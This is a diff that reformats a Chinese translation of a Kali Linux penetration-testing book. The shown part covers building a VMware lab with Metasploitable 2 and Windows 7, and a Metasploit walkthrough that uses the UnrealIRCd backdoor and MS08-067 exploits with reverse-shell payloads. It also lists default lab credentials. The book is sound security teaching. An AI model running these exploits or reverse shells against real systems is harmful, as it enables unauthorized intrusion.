@@ -1,21 +1,11 @@
+
 # Kali Linux 基础安全测试
-
-
-
-
-
 
 使用攻击者会使用的相同策略来测试你的计算机系统安全。
 
-
-
-
-
-
-
 感谢我的家人对我无尽的支持和祈祷，你们真是上帝赐予的礼物！
-感谢我在信息安全与网络安全社区的朋友们与我分享知识和时间。还要感谢我们当地书写俱乐部的朋友们（特别是你，Bill！），没有了你们的投入、陪伴和建议，这一切绝不会发生。
 
+感谢我在信息安全与网络安全社区的朋友们与我分享知识和时间。还要感谢我们当地书写俱乐部的朋友们（特别是你，Bill！），没有了你们的投入、陪伴和建议，这一切绝不会发生。
 
 > “知彼知己，百战不殆。” —— 孙子
 
@@ -33,39 +23,19 @@ Daniel 协助了许多安全课程和技术书籍，主要基于 Backtrack 和 K
 
 Daniel W. Dieterle
 
-Cyberarms@live.com
-Cyberarms.wordpress.com
+`Cyberarms@live.com`
 
-
-
-
-
+`Cyberarms.wordpress.com`
 
 ## 基础 Metasploit 命令
 
-核心命令
-
-文件系统命令
-
-网络命令
-
-系统命令
-
-捕捉摄像头视频、截图和声音
-
-运行脚本
-
-玩转模块 - 从远程系统恢复被删除的文件
-
-
-
-
-
-
-
-
-
-
+- 核心命令
+- 文件系统命令
+- 网络命令
+- 系统命令
+- 捕捉摄像头视频、截图和声音
+- 运行脚本
+- 玩转模块 - 从远程系统恢复被删除的文件
 
 ## 安装 Veil
 
@@ -74,22 +44,27 @@ Cyberarms.wordpress.com
 ## 获取远程 shell
 
 ## 第 10 章 – Windows 权限提升
+
 - 绕过 UAC
 
 ## 第 11 章 - 数据包捕获与中间人攻击
+
 - 使用 Arpo 进行中间人攻击
 - 使用 Urlsnf 查看 URL 信息
 - 使用 Driftnet 查看无线数据包
 - 在 Metasploit 中进行无线包捕获
 - Wireshark
 - BeEF 实战
+
 ## 第四部分 - 社会工程
 
 ## 第 13 章 – 社会工程
+
 - 简介
 - 社会工程防御
 
 ## 第 14 章 – 社会工程工具
+
 - 使用 SET
 - 批量邮件发送
 - SET 的 JavaInjector 攻击
@@ -97,11 +72,12 @@ Cyberarms.wordpress.com
 - 使用 SET 进行高级攻击
 
 ## 第 15 章 - Subterfuge
+
 - 使用 Subterfuge 进行自动攻击
 - 浏览器自动利用
 
-
 ## 第 16 章 – 破解简单的 Hash
+
 - 在线破解 LM Hash
 - 在 Kali 中查找 Hash
 
@@ -132,31 +108,16 @@ Cyberarms.wordpress.com
 - 破解更复杂的密码
 - 使用更大的字典文件
 - 更高级的破解方法
-
-
-
-
-
-
-
-
-
-
 - 使用 MacChanger
-
-
-
-
 - 在树莓派上安装 Kali
 
 ## 第 31 章 – Wi-Fi 渗透
+
 - 使用树莓派进行 Wi-Fi 渗透
 
 ## 第 32 章 – 网络防御与结论
+
 - 补丁与更新
-
-
-
 
 利用技术、根据公司管理设定的参数和准则来发现安全问题。
 
@@ -216,17 +177,17 @@ Backtrack 和 Kali 之间在工具使用上没有主要区别。Kali 基本上�
 
 ## 参考文献
 
-- 1. http://www.csmonitor.com/USA/Military/2011/0509/What-US-cybersecurity-needs-a-few-more-good
-- 2. http://www.theguardian.com/technology/2012/jul/10/us-master-hackers-alida
-- 3. http://en.wikipedia.org/wiki/List_of_countries_by_number_of_Internet_users
+1. `http://www.csmonitor.com/USA/Military/2011/0509/What-US-cybersecurity-needs-a-few-more-good`
+2. `http://www.theguardian.com/technology/2012/jul/10/us-master-hackers-alida`
+3. `http://en.wikipedia.org/wiki/List_of_countries_by_number_of_Internet_users`
 
 # 第一部分：安装与基本概述
 
 # 第2章 - 使用 VMWare 安装 Kali
 
-资源 - http://www.vmware.com/
+资源 - `http://www.vmware.com/`
 
-- VMware，Kali 安装指南 http://docs.kali.org/category/installation，Kali 下载 http://www.kali.org/downloads/，Kali 仓库 http://docs.kali.org/general-use/kali-linux-sources-list-repositories，Metasploitable 2 http://sourceforge.net/projects/metasploitable/files/Metasploitable/2/，微软评估软件 http://technet.microsoft.com/en-us
+- VMware，Kali 安装指南 `http://docs.kali.org/category/installation`，Kali 下载 `http://www.kali.org/downloads/`，Kali 仓库 `http://docs.kali.org/general-use/kali-linux-sources-list-repositories`，Metasploitable 2 `http://sourceforge.net/projects/metasploitable/files/Metasploitable/2/`，微软评估软件 `http://technet.microsoft.com/en-us`
 
 在本节中，我们在主机计算机上使用 VMWare Player 将 Kali Linux、Windows 7 和 Metasploitable 2 设置为虚拟机 (VM)。
 
@@ -238,9 +199,6 @@ Backtrack 和 Kali 之间在工具使用上没有主要区别。Kali 基本上�
 
 完成后，你应该拥有一个像这样的这样的测试网络：
 
-
-
-
 由于我们将处理存在漏洞的操作系统，请确保您在主机系统和公共互联网之间有一个防火墙路由器（最好是硬件的）。
 
 ## 安装 VMware Player & Kali
@@ -249,43 +207,35 @@ Backtrack 和 Kali 之间在工具使用上没有主要区别。Kali 基本上�
 
 下载并适用于您操作系统版本的 VMware Player。
 
-- 1. 下载并安装 VMware Player (https://my.vmware.com/web/vmware/downloads)
+1. 下载并安装 VMware Player (`https://my.vmware.com/web/vmware/downloads`)
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_18_0.png)
 
-- 2. 同意许可协议并选择您想要安装的位置，通常默认设置即可。
+2. 同意许可协议并选择您想要安装的位置，通常默认设置即可。
+3. 完成后点击“完成”（Finish）。
 
-- 3. 完成后点击“完成”（Finish）。
-
-下载 Kali VMware 镜像 (http://www.kali.org/downloads/) 并将其保存到您想要运行的位置。
+下载 Kali VMware 镜像 (`http://www.kali.org/downloads/`) 并将其保存到您想要运行的位置。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_19_0.png)
 
 （注：通过下载的镜像验证 SHAISUM 是一个好习惯，以确保您拥有的是合法的镜像副本。有很多 MD5/SHA1 免费软件可用）
 
-- 5. 解压并解包下载的镜像（7-Zip 效果非常好）。
+5. 解压并解包下载的镜像（7-Zip 效果非常好）。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_19_1.png)
 
-- 6. 启动 VMware Player。
-
-- 7. 点击菜单中的“Player”。
-
-- 8. 然后点击“File”（文件）。
-
-- 9. 接下来点击“Open”（打开）。
-
-- 10. 浏览并找到提取出的 Kali .vmx 文件，选择它并点击“Open”（打开）。
-
-- 11. 它现在将出现在 VMware Player 的主界面上。
+6. 启动 VMware Player。
+7. 点击菜单中的“Player”。
+8. 然后点击“File”（文件）。
+9. 接下来点击“Open”（打开）。
+10. 浏览并找到提取出的 Kali `.vmx` 文件，选择它并点击“Open”（打开）。
+11. 它现在将出现在 VMware Player 的主界面上。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_19_2.png)
 
-- 12. 选中 Kali 虚拟机，点击“编辑虚拟机设置”（Edit Virtual Machine Settings）。
-
-- 13. 在此处，您可以查看并更改虚拟机的任何设置：
-
-- 14. 点击“网络适配器”（Network Adapter）：
+12. 选中 Kali 虚拟机，点击“编辑虚拟机设置”（Edit Virtual Machine Settings）。
+13. 在此处，您可以查看并更改虚拟机的任何设置：
+14. 点击“网络适配器”（Network Adapter）：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_20_0.png)
 
@@ -295,19 +245,15 @@ Backtrack 和 Kali 之间在工具使用上没有主要区别。Kali 基本上�
 
 （如果您需要知道 Kali 或 Metasploitable 的 IP 地址，只需在终端窗口中输入 `ifconfig`。在基于 Windows 的虚拟机上，只需在命令提示符中输入 `ipconfig`。）
 
-- 15. 点击“取消”（cancel）返回 VMware Player 主界面。
-
-- 16. 现在只需点击“播放虚拟机”（Play Virtual Machine）来启动 Kali。您可能会收到一条消息询问虚拟机是否已移动或复制，只需点击“我复制了它”（I copied it）。
-
-- 17. 当提示安装 VMware Tools 时，选择稍后安装。
-
-- 18. 当 Kali 启动时，您将到达登录界面：
+15. 点击“取消”（cancel）返回 VMware Player 主界面。
+16. 现在只需点击“播放虚拟机”（Play Virtual Machine）来启动 Kali。您可能会收到一条消息询问虚拟机是否已移动或复制，只需点击“我复制了它”（I copied it）。
+17. 当提示安装 VMware Tools 时，选择稍后安装。
+18. 当 Kali 启动时，您将到达登录界面：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_21_0.png)
 
-- 19. 点击“其他”（Other），然后使用用户名“root”和密码“toor”（root 的倒序）登录。
-
-- 20. 随后您将登录 Kali 并看到主桌面：
+19. 点击“其他”（Other），然后使用用户名“root”和密码“toor”（root 的倒序）登录。
+20. 随后您将登录 Kali 并看到主桌面：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_21_1.png)
 
@@ -317,13 +263,13 @@ Backtrack 和 Kali 之间在工具使用上没有主要区别。Kali 基本上�
 
 我们稍后会介绍如何在 Kali 中进行操作，但首先，我们需要将 Kali 更新到最新版本。虚拟机镜像有些旧，因此有很多更新可能需要花很时间下载。
 
-## 打开一个终端窗口：
+## 打开一个终端窗口
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_22_0.png)
 
-- 2. 输入 `apt-get update` 并按回车键：
+2. 输入 `apt-get update` 并按回车键：
 
-```
+```bash
 root@kali:~# apt-get update
 Get:1 http://http.kali.org kali/ InRelease [22.0 KB]
 Get:2 http://http.kali.org kali/updates InRelease [11.8 KB]
@@ -336,9 +282,9 @@ Ign http://http.kali.org kali/main/non-free Translation-en-US
 Ign http://http.kali.org kali/main/non-free Translation-en-en
 ```
 
-- 3. 然后输入 `apt-get dist-upgrade`：
+3. 然后输入 `apt-get dist-upgrade`：
 
-```
+```bash
 root@kali:~# apt-get dist-upgrade
 Reading package lists... Done
 Building dependency tree... Done
@@ -347,11 +293,12 @@ Calculating upgrade... Done
 The following packages will be REMOVED:
 console-tools icedtea-jre openvas
 ```
+
 > 在提示需要额外空间时输入“y”并回车。这可能需要一段时间，所以这可能是休息的好时间！
 
-- 4. 完成后重启。
+4. 完成后重启。
 
-技术提示：如果您想，可以手动为 Kali 添加额外的源。例如，如果您想要最新的版本，可以为 Kali 添加“Bleeding Edge”源。但这些源带有警告，称未经维护且优先级较低。更多信息请访问：http://docs.kali.org/general-use/kali-linux-repositories/。现在 Kali 已安装完成并就绪。我们将在下一节详细查看桌面。
+技术提示：如果您想，可以手动为 Kali 添加额外的源。例如，如果您想要最新的版本，可以为 Kali 添加“Bleeding Edge”源。但这些源带有警告，称未经维护且优先级较低。更多信息请访问：`http://docs.kali.org/general-use/kali-linux-repositories/`。现在 Kali 已安装完成并就绪。我们将在下一节详细查看桌面。
 
 ## 安装 VMware Tools
 
@@ -369,33 +316,43 @@ console-tools icedtea-jre openvas
 
 Metasploitable 2 是我们将练习利用的故意漏洞操作系统，也以虚拟机的形式提供。和 Kali 虚拟机一样，我们只需要下载 Metasploitable 2 镜像，解压并用 VMware 打开。就这么简单。
 
-- 1. 下载 Metasploitable 2 (http://sourceforge.net/projects/metasploitable/files/Metasplo2/) 并将其放在保存的文件夹中。
+1. 下载 Metasploitable 2 (`http://sourceforge.net/projects/metasploitable/files/Metasplo2/`) 并将其放在保存的文件夹中。
 
-- 2. 解压文件。
+
+
+## 2. 解压文件
 
 | 文件名 | 日期 | 大小 |
 | :--- | :--- | :--- |
-| Metasploitable.nvram | 5/21/2012 上午1:45 | 9 KB |
-| Metasploitable.vmdk | 5/21/2012 上午1:46 | 900,864 KB |
-| Metasploitable.vms | 5/21/2012 上午1:46 | 1 KB |
-| Metasploitable.vmx | 5/21/2012 上午1:46 | 3 KB |
-| Metasploitable.vmf | 5/21/2012 上午1:37 | 1 KB |
+| `Metasploitable.nvram` | 5/21/2012 上午1:45 | 9 KB |
+| `Metasploitable.vmdk` | 5/21/2012 上午1:46 | 900,864 KB |
+| `Metasploitable.vms` | 5/21/2012 上午1:46 | 1 KB |
+| `Metasploitable.vmx` | 5/21/2012 上午1:46 | 3 KB |
+| `Metasploitable.vmf` | 5/21/2012 上午1:37 | 1 KB |
 
-- 3. 然后通过启动 VMware Player 在 VMware 中打开 Metasploitable 2，点击“Player”、“File”，然后浏览并选择 Metasploitable.vmx 文件并点击“Open”。
+## 3. 通过 VMware Player 打开虚拟机
 
-- 4. 它现在将出现在 VMware Player 菜单中：
+启动 VMware Player，在 VMware 中打开 Metasploitable 2。点击“Player”、“File”，然后浏览并选择`Metasploitable.vmx`文件并点击“Open”。
+
+## 4. 确认虚拟机出现在菜单中
+
+它现在将出现在 VMware Player 菜单中：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_24_0.png)
 
-- 5. 现在进入 Metasploitable 的“编辑虚拟机设置”，确保网络接口设置为“NAT”：
+## 5. 配置网络设置
+
+现在进入 Metasploitable 的“编辑虚拟机设置”，确保网络接口设置为“NAT”：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_24_1.png)
 
 Metasploitable 2 现在准备可以使用。
 
-*** 警告 *** - Metasploitable 是一个故意留有漏洞的操作系统。切勿在互联网上开放运行。确保在您的主机系统和互联网之间安装了防火墙。
+> **警告**：Metasploitable 是一个故意留有漏洞的操作系统。切勿在互联网上开放运行。确保在您的主机系统和互联网之间安装了防火墙。
 
-- 6. 继续“播放”Metasploitable 系统，如果被问是否移动或复制了它，点击“我复制了它”。
+## 6. 启动系统
+
+继续“播放”Metasploitable 系统，如果被问是否移动或复制了它，点击“我复制了它”。
 
 你现在可以看到 Metasploitable 桌面：
 
@@ -407,12 +364,16 @@ Metasploitable 2 现在准备可以使用。
 metasploitable login: _
 ```
 
-- 7. 使用屏幕上的凭据登录。
+## 7. 登录系统
 
-登录名：msfadmin
-密码：msfadmin
+使用屏幕上的凭据登录。
 
-- 8. 在终端提示符处输入 `ifconfig` 获取 Metasploitable 机器的 IP 地址：
+- 登录名：`msfadmin`
+- 密码：`msfadmin`
+
+## 8. 获取 IP 地址
+
+在终端提示符处输入`ifconfig`获取 Metasploitable 机器的 IP 地址：
 
 ```
 msfadmin@metasploitable:~$ ifconfig
@@ -420,7 +381,7 @@ eth0 Link encap:Ethernet
 inet addr:192.168.198.129
 ```
 
-在此情况下，IP 地址为 192.168.198.129。由于我们使用的是 DHCP 地址，在我们关闭系统并重启时，虚拟机的 IP 可能会发生变化。因此，如果开始出现通信问题，检查并验证它们是一个好主意。
+在此情况下，IP 地址为`192.168.198.129`。由于我们使用的是 DHCP 地址，在我们关闭系统并重启时，虚拟机的 IP 可能会发生变化。因此，如果开始出现通信问题，检查并验证它们是一个好主意。
 
 我们现在已经有了 Metasploitable 和 Kali 系统。
 
@@ -430,23 +391,23 @@ inet addr:192.168.198.129
 
 http://technet.microsoft.com/en-us/evalcenter/hh699156
 
-所以，如果您想跟随 Windows 7（或 XP）章节，您需要在 VMware Player 中安装一个授权的 Windows 7 。
+所以，如果您想跟随 Windows 7（或 XP）章节，您需要在 VMware Player 中安装一个授权的 Windows 7。
 
 我将不会介绍如何在 VMware 中安装 Windows 7，但基本上您只需要 Windows 7 光盘和密钥，并通过点击“新安装”并指向您的光驱驱动器进行全盘安装。
 
+### 欢迎使用新虚拟机向导
 
-
-
-
-# 欢迎使用新虚拟机向导
 虚拟机就像一台物理计算机；它需要操作系统。你将如何安装客体操作系统？
 
 从以下位置安装：
-安装光盘：
-DVD RW 驱动器 (D:)
+
+- 安装光盘：
+- DVD RW 驱动器 (D:)
+
 将安装光盘插入此驱动器以继续。
 
 然后像通常一样安装 Windows 7 即可。
+
 完成后，你将拥有一个 Windows 7 虚拟机：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_26_0.png)
@@ -466,18 +427,20 @@ DVD RW 驱动器 (D:)
 | 打印机 | 已存在 |
 | 显示器 | 自动检测 |
 
-运行虚拟机并在 Windows 7 命令提示符中运行“ipconfig”以查看其 IP 地址：
+运行虚拟机并在 Windows 7 命令提示符中运行`ipconfig`以查看其 IP 地址：
 
+```
 Microsoft Windows [版本 6.1.7601]
-
 版权所有 (c) 2009 Microsoft Corporation。保留所有。
 
 C:\Users\Fred>ipconfig
 
 Windows IP 配置
+
 以太网适配器 局域网:
 
 IPv4 地址. . . . . . . . . . . . : 192.168.198.130
+```
 
 最后，如果你愿意，在提示时安装适用于 Windows 的 VMware Tools：
 
@@ -493,7 +456,7 @@ IPv4 地址. . . . . . . . . . . . : 192.168.198.130
 
 在书的其余部分我们将一直使用这种设置。
 
-提醒一下，由于使用了 VMware 的 DHCP，系统的 IP 地址在重启时可能会发生变化。我部分使用这一点是因为在现实世界中你总是会使用不同的目标 IP 地址。但如果你迷路了，可以在虚拟机上运行 "ifconfig" (Linux) 或 "ipconfig" (Windows) 来查找更改后的 IP 地址。
+提醒一下，由于使用了 VMware 的 DHCP，系统的 IP 地址在重启时可能会发生变化。我部分使用这一点是因为在现实世界中你总是会使用不同的目标 IP 地址。但如果你迷路了，可以在虚拟机上运行`ifconfig`(Linux) 或`ipconfig`(Windows) 来查找更改后的 IP 地址。
 
 最后，永远不要在互联网上直接运行 Metasploitable，因为它是刻意留有漏洞的。
 
@@ -503,7 +466,7 @@ IPv4 地址. . . . . . . . . . . . : 192.168.198.130
 
 安装时你会注意到的最大特点之一是 Kali 是基于 Debian Linux 的，而不是 Ubuntu（之前的版本是基于 Ubuntu）。如果你习惯了 Backtrack，桌面仍然使用 Gnome，但看起来有不同的视觉效果和感受。
 
-## 顶部菜单栏
+### 顶部菜单栏
 
 我们将从顶部菜单栏开始之旅。
 
@@ -511,13 +474,14 @@ IPv4 地址. . . . . . . . . . . . : 192.168.198.130
 
 中间是日期和时间，右侧是音量控制图标、网络图标（你可以在此处查看和编辑网络连接），最后是用户菜单，你可以在此处访问系统设置、切换用户或注销。
 
-## 应用程序菜单
+### 应用程序菜单
 
 应用程序菜单是 Kali 中的主菜单。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_28_0.png)
 
 在此菜单下，你可以找到以下菜单：
+
 - 附件（Accessories）菜单包含你在操作系统中预期找到的工具。
 - 电子（Electronics）标签包含编程实用程序。
 - Kali Linux 是访问安全程序的主菜单。
@@ -525,14 +489,16 @@ IPv4 地址. . . . . . . . . . . . : 192.168.198.130
 
 其余都是一目自明的。
 
-## Kali Linux 菜单
+### Kali Linux 菜单
 
 对我们最重要的是，Kali Linux 选项是找到大多数安全工具的地方。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_29_0.png)
 
 快速查看菜单发现，Kali 添加了十大安全工具菜单，以便你更快地使用你喜欢的工具。
+
 Aircrack-ng、Burpsuite、Metasploit、Wireshark 以及其他几个程序现在触手可及。
+
 如果你熟悉原始 Backtrack，不用担心，所有的工具都存在于一个非常类似的系统中。
 
 要导航菜单，只需找到你想要的主题，例如信息收集（Information Gathering），并跟踪菜单找到你需要的：
@@ -554,10 +520,12 @@ Aircrack-ng、Burpsuite、Metasploit、Wireshark 以及其他几个程序现在�
 ### 资源
 
 Metasploit 信息
+
 - http://www.offensive-security.com/metasploit-unleashed/Main_Page
 - http://www.offensive-security.com/metasploit-unleashed/Msfconsole_Commands
 
 安全公告网站
+
 - http://cve.mitre.org/
 - http://technet.microsoft.com/en-us/security/bullet
 
@@ -580,7 +548,7 @@ Metasploit Framework 是一个用于漏洞测试和利用的综合平台。它�
 
 ## 更新
 
-通常更新 Metasploit 只需运行 "msfupdate"，但根据 Rapid 7 网站，Metasploit 的更新与 Kali 同步的。
+通常更新 Metasploit 只需运行`msfupdate`，但根据 Rapid 7 网站，Metasploit 的更新与 Kali 同步的。
 
 (https://community.rapid.com/thread/30)
 
@@ -597,28 +565,12 @@ msf >
 + --= 312 payloads - 30 encoders - 8 nops
 ```
 
-当所有其他方法都失效且你在 Metasploit 或 Meterpreter shell 中感到迷茫时，尝试输入“help”命令。
-你也可以使用“tab”键来自动补全行，或按两次显示所有可用漏洞和有效负载。
+当所有其他方法都失效且你在 Metasploit 或 Meterpreter shell 中感到迷茫时，尝试输入`help`命令。
 
-系统在重启时可能会发生变化。我部分使用这一点是因为在现实世界中你总是会使用不同的目标 IP 地址。但如果你迷路了，可以在虚拟机上运行 "ifconfig" (Linux) 或 "ipconfig" (Windows) 来查找更改后的 IP 地址。
-
-最后，永远不要在互联网上直接运行 Metasploitable，因为它是刻意留有漏洞的。
-
-## 桌面快速导览
-
-让我们花点时间对 Kali 菜单和界面进行简短导览。
-
-安装时你会注意到的最大特点之一是 Kali 是基于 Debian Linux 的，而不是 Ubuntu（之前的版本是基于 Ubuntu）。如果你习惯了 Backtrack，桌面仍然使用 Gnome，但看起来有不同的视觉效果和感受。
-
-## 顶部菜单栏
-
-我们将从顶部菜单栏开始之旅。
-
-顶部菜单包含应用程序（Applications）菜单，这是访问 Kali 中包含的所有程序的主要入口；位置（Places）菜单允许你在文件系统中进行导航。接下来是 Firefox 网页浏览器，之后是终端（Terminal）提示符的快捷方式。
-
-中间是日期和时间，右侧是音量控制图标、网络图标（你可以在此处查看和编辑网络连接），最后是用户菜单，你可以在此处访问系统设置、切换用户或注销。
+你也可以使用`tab`键来自动补全行，或按两次显示所有可用漏洞和有效负载。
 
 使用 Metasploit 攻击目标通常涉及：
+
 1. 选择漏洞（Exploit）
 2. 设置漏洞选项
 3. 选择有效负载（Payload）
@@ -639,23 +591,19 @@ msf >
 
 我们稍后会讨论 Meterpreter Shell，但现在让我们先快速涵盖前几个步骤。
 
-
-
-
-
 ## PostgreSQL 数据库
 
-你需要做的只是在运行 `msfconsole` 之前启动 PostgreSQL 数据库（虽然不运行它搜索也能工作，只是速度会慢一些）。
+你需要做的只是在运行`msfconsole`之前启动 PostgreSQL 数据库（虽然不运行它搜索也能工作，只是速度会慢一些）。
 
 要在终端提示符启动数据库，请输入以下命令：
 
-- sudo service postgresql start
-- service metasploit start
-- msfconsole
+- `sudo service postgresql start`
+- `service metasploit start`
+- `msfconsole`
 
 Metasploit 允许你通过多种方式搜索漏洞，包括通过平台，甚至是 CVE（常见漏洞与披露）编号和 bugtrack 编号。
 
-输入“help search”可以查看所有选项：
+输入`help search`可以查看所有选项：
 
 ```
 msf> help search [keywords]
@@ -677,7 +625,7 @@ Examples:
 search cve:2009 type:exploit app
 ```
 
-要按名称搜索，只需输入 search 和你想要的文本。例如，为了查看 Metasploit 是否有针对微软安全公告 MS13-069 漏洞的利用程序：
+要按名称搜索，只需输入`search`和你想要的文本。例如，为了查看 Metasploit 是否有针对微软安全公告 MS13-069 漏洞的利用程序：
 
 ```
 msf> search ms13-069
@@ -698,6 +646,8 @@ exploit/windows/local/ppr_flatten_rec 2013-05-15 00:00:00 UTC average Windows EP
 ```
 
 查看今年的所有的 CVE ID（截断列表）：
+
+
 
 ```
 msf> search cve:2013
@@ -726,7 +676,7 @@ normal  auxiliary/dos/monkey_headers
 msf> search unreal
 ```
 
-当你使用一个想要了解更多信息的漏洞时，只需复制粘贴完整路径并使用 **info** 命令：
+当你使用一个想要了解更多信息的漏洞时，只需复制粘贴完整路径并使用`info`命令：
 
 ```
 msf>info exploit/unix/irc/unreal_ircd_3281_backdoor
@@ -759,7 +709,7 @@ http://www.unrealircd.com/txt/unrealcadvisory.20130612.txt
 
 信息界面显示了作者姓名、简要概述（未显示）以及可以设置的基本选项、漏洞的描述以及网站安全公告引用（已显示）。
 
-如上面的图片所示，我们可以为此漏洞设置几个选项，这将引导我们下一个章节。但在设置漏洞之前，我们需要“使用”（use）它。一旦我们有了想要的漏洞，只需运行漏洞名称运行“use”命令。
+如上面的图片所示，我们可以为此漏洞设置几个选项，这将引导我们下一个章节。但在设置漏洞之前，我们需要“使用”（`use`）它。一旦我们有了想要的漏洞，只需运行漏洞名称运行`use`命令。
 
 ```
 msf> use exploit/unix/irc/unreal_ircd_3281_backdoor
@@ -770,11 +720,11 @@ msf exploit(unix/irc/unreal_ircd_3281_backdoor) >
 
 # 设置漏洞选项
 
-在 Metasploit 中设置选项非常简单，使用“set”命令后跟变量名，然后是值：set <Variable Name> <Value> (img/ff9cd19afe44ae5427ee29e66f_0)
+在 Metasploit 中设置选项非常简单，使用`set`命令后跟变量名，然后是值：`set <Variable Name> <Value>` (img/ff9cd19afe44ae5427ee29e66f_0)
 
-要设置可以设置哪些变量，使用“show options”命令 (img/ff9cd19afe44ae5427ee29e66f_1)。该漏洞使用了变量 RHOST 和 RPORT。RHOST 是我们要攻击的远程主机，RPORT 是远程端口。
+要设置可以设置哪些变量，使用`show options`命令 (img/ff9cd19afe44ae5427ee29e66f_1)。该漏洞使用了变量`RHOST`和`RPORT`。`RHOST`是我们要攻击的远程主机，`RPORT`是远程端口。
 
-如果我们提前并设置 RHOST 变量。如果目标系统的 IP 地址是 192.168.0.20，则使用以下命令：
+如果我们提前并设置`RHOST`变量。如果目标系统的 IP 地址是`192.168.0.20`，则使用以下命令：
 
 ```
 msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.0.20
@@ -782,20 +732,23 @@ RHOST => 192.168.0.20
 msf exploit(unreal_ircd_3281_backdoor) >
 ```
 
-如果我们再次运行“show options”命令，可以看到变量已经设置好了：
+如果我们再次运行`show options`命令，可以看到变量已经设置好了：
 
 | Name | Current Setting | Required | Description |
+
 | :--- | :--- | :--- | :--- |
+
 | RHOST | 192.168.0.20 | yes |目标地址 |
+
 | RPORT | 6667 | yes | 端口 |
 
-这就是该漏洞中你需要设置的所有内容。你现在可以运行“exploit”命令来执行。如果你感到有点迷，不要担心，我们将在后续章节详细介绍。
+这就是该漏洞中你需要设置的所有内容。你现在可以运行`exploit`命令来执行。如果你感到有点迷，不要担心，我们将在后续章节详细介绍。
 
 ## 多目标类型
 
 Unreal 后门是一个相当容易使用的漏洞。有些漏洞有你需要设置的多个变量，它们可能有一些可以配置的可选变量。
 
-当你使用 Metasploit 时，会发现有多个可以攻击的目标类型，并且漏洞工作需要设置精确的目标。查看目标，使用“show targets”。在上面的漏洞中，目标是自动的，所以我们不需要设置。
+当你使用 Metasploit 时，会发现有多个可以攻击的目标类型，并且漏洞工作需要设置精确的目标。查看目标，使用`show targets`。在上面的漏洞中，目标是自动的，所以我们不需要设置。
 
 ```
 msf exploit(unreal_ircd_3281_backdoor) > show targets
@@ -809,25 +762,35 @@ Id Name
 
 ## 在 Windows XP 上获取远程 shell
 
-我们简要看了 Linux 漏洞，让我们运行 ms08-067 漏洞，因为它是流行的 Windows 漏洞之一。
+我们简要看了 Linux 漏洞，让我们运行`ms08-067`漏洞，因为它是流行的 Windows 漏洞之一。
 
 1. 开始，直接使用漏洞：
+
 `msf > use exploit/windows/smb/ms08_067_netapi`
-2. 现在输入“show options”：(img/ff9cd19afe44ae5427ee29e66f_38_0) 注意默认目标设置为“自动目标”。我使用自动目标的结果不一，有时如果你设置了精确的目标，效果更好。
-3. 如果我们想设置特定目标，使用“show targets”：
+
+2. 现在输入`show options`：(img/ff9cd19afe44ae5427ee29e66f_38_0) 注意默认目标设置为“自动目标”。我使用自动目标的结果不一，有时如果你设置了精确的目标，效果更好。
+
+3. 如果我们想设置特定目标，使用`show targets`：
+
 `msf exploit(ms08_067_netapi) > show targets` (img/ff9cd19afe44ae5427ee29e66f_38_1)
-4. 那么，输入“set target <ID#”来设置实际目标。
+
+4. 那么，输入`set target <ID#`来设置实际目标。
+
 `msf exploit(ms08_067_netapi) > set target 2`
+
 `target => 2`
-5. 再次通过“show options”将显示我们确实设置了目标值：
+
+5. 再次通过`show options`将显示我们确实设置了目标值：
 
 ## 漏洞目标：
 
 | Id | Name |
+
 | :--- | :--- |
+
 | 2 | Windows XP SP0/SP1 Universal |
 
-最后，虽然在常规漏洞中未使用，但如果我们需要，也可以设置高级选项。要显示高级选项，只需输入“show advanced”：
+最后，虽然在常规漏洞中未使用，但如果我们需要，也可以设置高级选项。要显示高级选项，只需输入`show advanced`：
 
 ```
 msf exploit(ms08_067_netapi) > show advanced
@@ -846,11 +809,11 @@ Current Setting :
 Description : 包含上下文信息的文件
 ```
 
-现在我们已经看到了如何选择漏洞以及如何设置选项。在许多漏洞中，我们还需要设置载荷（payload）。
+现在我们已经看到了如何选择漏洞以及如何设置选项。在许多漏洞中，我们还需要设置载荷（`payload`）。
 
 ## 选择载荷
 
-如果不能对机器做任何事情，利用机器还有什么乐趣呢？载荷允许你对被利用的系统执行某些功能操作。Metasploit 提供了许多可以使用不同的载荷。要查看它们，只需输入“show payloads”：
+如果不能对机器做任何事情，利用机器还有什么乐趣呢？载荷允许你对被利用的系统执行某些功能操作。Metasploit 提供了许多可以使用不同的载荷。要查看它们，只需输入`show payloads`：
 
 ```
 msf exploit(ms08_067_netapi) > show payloads
@@ -872,16 +835,17 @@ ive DLL Injection, Bind TCP Stager (IPv6)
 windows/inject/bind_metf_tcp  *             normal Reflecti
 ```
 
-
-
-或者你输入“set payload”并按两次回键。这将提示 Metasploit 询问你是否想查看所有可用的载荷（payload）：
+或者你输入`set payload`并按两次回键。这将提示 Metasploit 询问你是否想查看所有可用的载荷（`payload`）：
 
 大多数载荷以“操作系统/Shell 类型”的形式列出，如下：
 
-- set payload/osx/x86/shell_reverse_tcp
-- set payload/linux/x64/shell_reverse_tcp
-- set payload/windows/shell_reverse_tcp
-- set payload/windows/meterpreter/reverse_tcp
+- `set payload/osx/x86/shell_reverse_tcp`
+
+- `set payload/linux/x64/shell_reverse_tcp`
+
+- `set payload/windows/shell_reverse_tcp`
+
+- `set payload/windows/meterpreter/reverse_tcp`
 
 只需为你的目标选择正确的操作系统，并挑选你想要的载荷即可。
 
@@ -889,11 +853,11 @@ windows/inject/bind_metf_tcp  *             normal Reflecti
 
 如果我们需要使用一个远程终端 shell 来远程运行命令，请使用标准 shell。如果你希望具备操纵会话并运行扩展命令的能力，你将需要 Meterpreter shell（我们将在下一章中详细讨论）。
 
-载荷有不同的方式向攻击系统返回通信。我通常更倾向于使用 reverse_tcp shell，因为一旦它们在目标系统上执行，就会告诉攻击机器向外连接到我们的 Kali 系统。
